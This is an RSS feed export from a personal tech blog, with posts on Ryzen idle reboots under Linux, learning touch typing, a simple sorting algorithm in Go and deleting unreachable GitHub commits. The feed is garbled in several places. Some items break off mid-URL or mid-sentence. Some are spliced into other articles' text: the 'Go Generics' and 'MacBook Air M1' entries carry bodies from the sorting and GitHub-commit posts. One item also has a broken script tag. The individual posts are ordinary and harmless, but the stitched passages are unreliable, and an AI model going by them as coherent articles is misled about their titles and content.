<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>articles</title>
    <link>https://klingt.net/articles</link>
    <description></description>
    <managingEditor> (Andreas Linz)</managingEditor>
    <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    <item>
      <title>AMD Ryzen random reboots under Linux when in idle</title>
      <link>https://klingt.net/articles/amd-ryzen-random-reboots-under-linux-when-in-idle.html</link>
      <description>This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="This post describes how to prevent random reboots for AMD Ryzen based Linux systems in idle state that use XMP memory profiles.">
  
  <title>AMD Ryzen random reboots under Linux when in idle</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>AMD Ryzen random reboots under Linux when in idle</h1>
<p>At the end of 2019 I decided to replace my, now 10 years old, trusty Intel i7 920 machine.
The main motivation was that the i7 was not powerful enough to drive a bunch of CPU hungry software synth, and I always wanted to have a machine that was able to handle any amount of audio plugins I throw at it.
It was still fast enough for some casual gaming or web browsing so I gave it to a friend who was looking for PC at that time.  Otherwise I would have had to throw it away, which would have made me feel a little guilty.
Anyways, AMD Ryzen was all the buzz at that time so I decided to go for that and ordered all the necessary parts.</p>
<p>Here are the relevant specs for reference:</p>
<ul>
<li>CPU: AMD Ryzen 3700X</li>
<li>Mainboard: ASUS ROG STRIX B450-I GAMING</li>
<li>Memory: 32GB Corsair DDR4 DRAM 3200MHz (part no. <code>CMK32GX4M2B3200C16</code>) <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
<li>OS: Arch Linux kernel 5.14.8-arch1-1</li>
</ul>
<p>Now to the actual topic of this post that is the random reboots that the Ryzen PC showed when running in idle for some time.
I ran a stress test over night and there was no spontaneous reboot so I could rule out a faulty power supply.
Checking <code>journalctl</code> for errors did not reveal anything suspicious <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, in fact the logs just ended before the reboot without any error message.</p>
<p>There is a <a href="https://wiki.gentoo.org/wiki/Ryzen#Random_reboots_with_mce_events">Ryzen page on Gentoo's wiki</a> that recommends to set two kernel parameters:</p>
<ul>
<li><code>idle=nomwait</code></li>
<li>and <code>processor.max_cstate=5</code></li>
</ul>
<p>The latter one disables certain processor <a href="https://www.thomas-krenn.com/en/wiki/Processor_P-states_and_C-states#C-states">c-states</a> which are basically sleep levels a processor can reach when idling, where C0 is the active state and Cn is the <em>lowest level of activity</em> or <em>power consumption</em>.  Disabling c-states is actually wasting energy and thus not very desirable.  I then set both kernel parameters and tried the latest kernel and the LTS variant, but spontaneous reboots still occured.  For a moment I ran out of ideas and suspected that either my Ryzen CPU was defective.</p>
<p>A couple of weeks passed and after some UEFI update I had to reset BIOS settings to <em>optimized defaults</em>.  With default settings no random reboots happened anymore!  Problem solved?  Not yet.  In default settings memory is not running at full speed and Ryzen CPUs scale quite well with memory bandwidth.  Enabling the <a href="https://www.intel.com/content/www/us/en/gaming/extreme-memory-profile-xmp.html">XMP memory profile</a> is, except the a different boot order, the only thing I change from defaults.  This made me curious and after some googling I stumbled over a <a href="https://linustechtips.com/topic/1298348-ryzen-reboot-at-idle-solved-rma/">linustechtips forum thread</a> where someone suggested to disable memory <em>power down mode</em>.  Because BIOS settings are often undocumented I cannot exactly say what this settings does, except from the obviously disabling some memory power saving feature.  Anyways, this setting was located under <code>AI Tweaker -&gt; Memory Timing Controls</code> which is kind of hidden.</p>
<p>To make a long story short, disabling memory <em>power down mode</em> made the random reboots disappear, even when if the memory XMP profile is activated.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>dmidecode to the rescue, god knows which RAM I had installed: <code>$ sudo dmidecode --type memory | grep -i part</code>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><code>$ journalctl --priority 0..3 --boot=-1</code>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Learning Touch Typing</title>
      <link>https://klingt.net/articles/learning-touch-typing.html</link>
      <description>My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.">
  
  <title>Learning Touch Typing</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Learning Touch Typing</h1>
<p>Lately two articles about developer productivity appeared in my news feed.  The first was <a href="https://scattered-thoughts.net/writing/speed-matters/">speed matters</a>, which is part of the great <a href="https://scattered-thoughts.net/writing/reflections-on-a-decade-of-coding/">reflections on a decade of coding</a> article series, and second is <a href="https://danluu.com/productivity-velocity/">some reasons to work on productivity and velocity</a> by Dan Luu.  Both articles stated that <a href="https://en.wikipedia.org/wiki/Touch_typing">touch typing</a> improved their productivity.  The productivity boost was not limited to a bare increase in word per minute that one can type, instead the greater leverage comes from an increased accuracy.  Making less typing errors improves the writing flow because every typo requires a context switch in order to fix the mistake.  Jamie Brandon wrote:</p>
<blockquote>
<p>If you compare two coders, one who can touch type and one who has to hunt and peck, the difference between them is not just down to typing speed. The hunter-and-pecker has to think about typing! This consumes attention and short-term memory that is sorely needed for thinking about the program itself.</p>
</blockquote>
<p>Dan Luu  wrote this about typing speed:</p>
<blockquote>
<p>I've actually looked at where my time goes and a lot of it goes to things that are canonical examples of things that you shouldn't waste time improving because people don't spend much time doing them.</p>
<p>An example of one of these, the most commonly cited bad-thing-to-optimize example that I've seen, is typing speed (when discussing this, people usually say that typing speed doesn't matter because more time is spent thinking than typing). But, when I look at where my time goes, a lot of it is spent typing.</p>
</blockquote>
<p>Reading both articles motivated me to give it another try.  I was satisfied with the speed of my self learned four finger typing method but what actually annoyed me was how many typing errors I made.  One thing that I can say for sure is fixing too many typing mistakes let me loose my &quot;flow&quot;.</p>
<p>Learning how to touch type takes a lot of dedication, it feels like learning an instrument or how to play the piano (even though it's quite a bit easier).  The hardest part for me was to realize that touch typing will be a lot slower than my current technique until I get more comfortable with it.  As always, learning something takes practice, practice and even more practice.</p>
<p>Learning touch typing begins with the home row, this is the middle row of your keyboard where your fingers will rest and return to after hitting any key.  For the basics I used <a href="https://www.typingtom.com/lessons">typingtom.com</a> with which I learned how to type on the home and top row after a day or two.  But the lessons were too repetitive, so they quickly became boring.  Luckily there are a bunch of alternatives from which I chose <a href="https://www.keybr.com">keybr.com</a> because it provided some nice statistics for tracking the learning progress and the lessons used random but readable and pronounceable words spit out by some word generating algorithm.  Following is the progress chart after about a week of practicing touch typing:</p>
<p><img src="touch-typing-progress.png" alt="progress of learning touch typing"></p>
<p>The green line shows typing speed in words per minute, red is the number of errors and (kind of) purple is the number of keys in the lesson.  It took me about five days to learn all characters and to get as fast, if not even a bit faster, as with my previous hunt and peck approach.  In the last quarter of the graph you can see a steep decline in typing speed and this is because I activated capitalization and symbols.  On a US QWERTY keyboard most common symbols are located on the right half, hence they must be hit with the right hand pinky.  For me, one of the hardest things was learning to type with my pinky and ring finger.</p>
<p>Now it's all about practicing and getting back to speed.  For this reason I forced myself to write this article using touch typing which went okay but could have been a bit smoother 🙄  Anyways, if you now decide to learn this skill as well I wish you all the best 💪.  It's not as hard to learn as you might think and it should only take a month of typing to become fast and accurate.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>GitHub Pages DNS Setup</title>
      <link>https://kli]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Learning Touch Typing</title>
      <link>https://klingt.net/articles/learning-touch-typing.html</link>
      <description>My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="My experience of learning how to touch type, i.e. how to write on a keyboard using 10 fingers.">
  
  <title>Learning Touch Typing</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Learning Touch Typing</h1>
<p>Lately two articles about developer productivity appeared in my news feed.  The first was <a href="https://scattered-thoughts.net/writing/speed-matters/">speed matters</a>, which is part of the great <a href="https://scattered-thoughts.net/writing/reflections-on-a-decade-of-coding/">reflections on a decade of coding</a> article series, and second is <a href="https://danluu.com/productivity-velocity/">some reasons to work on productivity and velocity</a> by Dan Luu.  Both articles stated that <a href="https://en.wikipedia.org/wiki/Touch_typing">touch typing</a> improved their productivity.  The productivity boost was not limited to a bare increase in word per minute that one can type, instead the greater leverage comes from an increased accuracy.  Making less typing errors improves the writing flow because every typo requires a context switch in order to fix the mistake.  Jamie Brandon wrote:</p>
<blockquote>
<p>If you compare two coders, one who can touch type and one who has to hunt and peck, the difference between them is not just down to typing speed. The hunter-and-pecker has to think about typing! This consumes attention and short-term memory that is sorely needed for thinking about the program itself.</p>
</blockquote>
<p>Dan Luu  wrote this about typing speed:</p>
<blockquote>
<p>I've actually looked at where my time goes and a lot of it goes to things that are canonical examples of things that you shouldn't waste time improving because people don't spend much time doing them.</p>
<p>An example of one of these, the most commonly cited bad-thing-to-optimize example that I've seen, is typing speed (when discussing this, people usually say that typing speed doesn't matter because more time is spent thinking than typing). But, when I look at where my time goes, a lot of it is spent typing.</p>
</blockquote>
<p>Reading both articles motivated me to give it another try.  I was satisfied with the speed of my self leart.github.io.
</code></pre>
<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https:/Learning how to touch type takes a lot of dedication, it feels like learning an instrument or how to play the piano (even though it's quite a bit easier).  The hardest part for me was to realize that touch typing will be a lot slower than my current technique until I get more comfortable with it.  As always, learning something takes practice, practice and even more practice.</p>
<p>Learning touch typing begins with the home row, this is the middle row of your keyboard where your fingers will rest and return to after hitting any key.  For the basics I used <a href="https://www.typingtom.com/lessons">typingtom.com</a> with which I learned how to type on the home and top row after a day or two.  But the lessons were too repetitive, so they quickly became boring.  Luckily there are a bunch of alternatives from which I chose <a href="https://www.keybr.com">keybr.com</a> because it provided some nice statistics for tracking the learning progress and the lessons used random but readable and pronounceable words spit out by some word generating algorithm.  Following is the progress chart after about a week of practicing touch typing:</p>
<p><img src="touch-typing-progress.png" alt="progress of learning touch typing"></p>
<p>The green line shows typing speed in words per minute, red is the number of errors and (kind of) purple is the number of keys in the lesson.  It took me about five days to learn all characters and to get as fast, if not even a bit faster, as with my previous hunt and peck approach.  In the last quarter of the graph you can see a steep decline in typing speed and this is because I activated capitalization and symbols.  On a US QWERTY keyboard most common symbols are located on the right half, hence they must be hit with the right hand pinky.  For me, one of the hardest things was learning to type with my pinky and ring finger.</p>
<p>Now it's all about practicing and getting back to speed.  For this reason I forced myself to write this article using touch typing which went okay but could have been a bit smoother 🙄  Anyways, if you now decide to learn this skill as well I wish you all the best 💪.  It's not as hard to learn as you might think and it should only take a month of typing to become fast and accurate.</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Go Generics - A Quick Overview</title>
      <link>https://klingt.net/articles/go-generics-a-quick-overview.html</link>
      <description>In this blog post I will give a quick overview of Go Generics, i.e. what they are, how and when to use them.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this blog post I will give a quick overview of Go Generics, i.e. what they are, how and when to use them.">
  
  <title>Go Generics - A Quick Overview</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script (document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>The simplest sorting algorithm</h1>
<p>Not all of us have enjoyed a formal computer science education so let's define what a sorting algorithm actually does:</p>
<blockquote>
<p>A sorting algorithm takes an array and puts it elements in a certain order. What order means depends on the values stored in the array, e.g. in numerical order for numbers or lexicographic order for strings. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
</blockquote>
<p>Let's see an example, for an array <code>a = [4,2,3,1]</code>, a sorting algorithm applied to <code>a</code> will result in <code>[1,2,3,4]</code> when numerically sorted in ascending order.</p>
<p>Ok, now that we've defined what sorting means let's head over to why I am writing this article.  I discovered a paper called <em>Is this the simplest (and most surprising) sorting algorithm ever?</em> on <a href="https://lobste.rs/s/gh1ngc/is_this_simplest_most_surprising_sorting">lobste.rs</a> today.  Sorting algorithms are often used in basic computer science lectures to teach algorithms. The first algorithm students encounter is very often <a href="https://en.wikipedia.org/wiki/Bubble_sort">Bubble sort</a>.</p>
<p>Bubble sort is by no means a complicated algorithm as you can see in the prototypical Go implementation below:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}

for {
    swapped := false
    for i := 1; i &lt; len(xs); i++ {
        if xs[i-1] &gt; xs[i] {
            xs[i-1], xs[i] = xs[i], xs[i-1]
            swapped = true
        }
    }
    if !swapped {
        break
    }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>You can play with the implementation in the <a href="https://play.golang.org/p/wlTPJe7B5Ij">Go playground</a>.  It just iterates over the array until there is no element to swap anymore.  The only complicated thing is to keep around the state if two elements got swapped.</p>
<p>To my surprise the <a href="https://arxiv.org/pdf/2110.01111.pdf">paper</a> mentioned above is describing an even more straightforward way to sort an array:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}
for i := 0; i &lt; len(xs); i++ {
  for j := 0; j &lt; len(xs); j++ {
    if xs[i] &lt; xs[j] {
      xs[i], xs[j] = xs[j], xs[i]
    }
  }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>It does not get much simpler than this <del>and I assume that this might be the first algorithm future computer science students will encounter in their basic lessons.</del>  For me this algorithm is easier to remember than the classic bubble sort but the paper states that it is not a good candidate for an algorithm introduction.</p>
<blockquote>
<p>You certainly do not want to use it as a first example to introduce
students to sorting algorithms. It is not stable, does not work well for
external sorting, cannot sort inputs arriving online, and does not benefit
from partially sorted inputs.</p>
</blockquote>
<p>You can try this one out in the <a href="https://play.golang.org/p/jml6LqHApAN">Go playground</a> as well.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Take this definition with a grain of salt, I wrote this off the top of my head.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>How to delete unreachable commits on GitHub</title>
      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
  
  <title>How to delete unreachable commits on GitHub</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How to delete unreachable commits on GitHub</h1>
<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> commit shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
<p>As you can clearly see the commit is still there, and I only discovered this by accident when using GitHub's search.  So, the question is now how to delete this commit?  I cannot even reach the commit from my local repository:</p>
<pre><code class="language-shell">$ git show b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
fatal: bad object b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
</code></pre>
<p>Its parent commit is reachable though:</p>
<pre><code class="language-shell">$ git show 01aea0c8e1bdceb7869403814a4ebb87e25883b2
commit 01aea0c8e1bdceb7869403814a4ebb87e25883b2
Author: Andreas Linz &lt;klingt.net@gmail.com&gt;
Date:   Sun Jul 25 16:18:10 2021 +0200

    Initial commit
</code></pre>
<p>If the commit would still be part of my local repository I could have removed it with this call and subsequent <code>git push</code>.</p>
<pre><code class="language-shell">$ git reflog expire --expire-unreachable=all
</code></pre>
<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
<blockquote>
<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
</blockquote>
<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.  The dangling commit was <code>https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md</code>, but this will return a 404 since the commit was deleted.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>My MacBook Air M1 setup</title>
      <link>https://klingt.net/articles/my-macbook-air-m1-setup.html</link>
      <description>I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.">
  
  <title>My MacBook Air M1 setup</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Preface</h1>
<p>It was in the very early nineties when I first used a computer.  It must have been the 286 of my neighbor or the Amiga of my cousin.  A couple of years later, I think when I was in 4th grade, I got my first own computer.  A 486DX2-66 with 8 megs of RAM and a horribly slow 1GB SCSI hard drive, connected through an Adaptec ISA SCSI Controller card.  Not only was the hard drive slow as hell, maybe 1 MB/s at tops, it was also very noisy.  Annoyingly loud to be honest, like if it wrote every bit with a chisel into stone.  This machine ran MS-DOS and so I learned how to remove unnecessary drivers from <code>autoexec.bat</code>, like the mouse driver, in order to free up a couple kilobytes of RAM so that I can play DOOM or whatever.</p>
<p>Anyways, couple years later I got my first Windows PC, an AMD k6-2 with 333MHz that was equipped with the famous IBM Deskstar hard drive.  This hard disk was even noisier as my old SCSI drive while also being very unreliable, hence they were also known as IBM Deathstar.  Of course you can imagine how funny it was to ship the broken drive to IBM's service center somewhere in Great Britain, waiting for it to be returned so that I have a working PC again.  It took them over a month, or longer, to return the drive which meant that I had no computer in the meantime.  Actually, I didn't even know if they had received the drive or if it got lost in the english channel.  You just had to wait patiently in the good ol' days.  Unimaginable in today's world, people would get mad if they didn't receive an update every couple of hours.  Somehow people still knew how to be patient back then, and so was I, which there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
<blockquote>
<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
</blockquote>
<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.  The dangling commit was <code>https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md</code>, but this will return a 404 since the commit was deleted.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>The simplest sorting algorithm</title>
      <link>https://klingt.net/articles/the-simplest-sorting-algorithm.html</link>
      <description></description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <title>The simplest sorting algorithm</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>The simplest sorting algorithm</h1>
<p>Not all of us have enjoyed a formal computer science education so let's define what a sorting algorithm actually does:</p>
<blockquote>
<p>A sorting algorithm takes an array and puts it elements in a certain order. What order means depends on the values stored in the array, e.g. in numerical order for numbers or lexicographic order for strings. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
</blockquote>
<p>Let's see an example, for an array <code>a = [4,2,3,1]</code>, a sorting algorithm applied to <code>a</code> will result in <code>[1,2,3,4]</code> when numerically sorted in ascending order.</p>
